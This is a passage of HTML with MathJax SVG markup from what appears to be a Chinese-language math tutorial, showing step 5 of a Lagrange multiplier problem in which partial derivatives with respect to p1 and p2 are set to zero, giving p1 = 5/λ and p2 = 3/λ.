-138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(24213.4,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(25213.7,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(26375.4,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(27375.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(28315.2,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span></p>\n<hr>\n<p><strong>步骤 5：对每个变量求偏导并令为 0</strong></p>\n<p>对 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.126ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 939.6 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g></svg></mjx-container></span>：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.991ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"29.75ex\" height=\"5.138ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1391 13149.3 2271\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(344.8,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><rect width=\"1705.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(2223.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(3279.1,0)\"><g data-mml-node=\"mn\" transform=\"translate(439.8,676)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><rect width=\"1139.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(4880.9,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5881.1,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6741.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(7797.7,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8575.4,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(9853.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(11070.5,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(12126.3,0)\"><g data-mml-node=\"mn\" transform=\"translate(261.5,676)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(220,-686)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><rect width=\"783\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 对 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.126ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 939.6 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g></g></svg></mjx-container></span>：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.991ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"22.331ex\" height=\"5.025ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1341 9870.2 2221\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mn\" transform=\"translate(439.8,676)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><rect width=\"1139.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(1601.8,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2602,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3462.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(4518.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5296.3,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(6574.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(7791.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(8847.2,0)\"><g data-mml-node=\"mn\" transform=\"translate(261.5,676)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(220,-686)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><rect width=\"783\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 对 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" 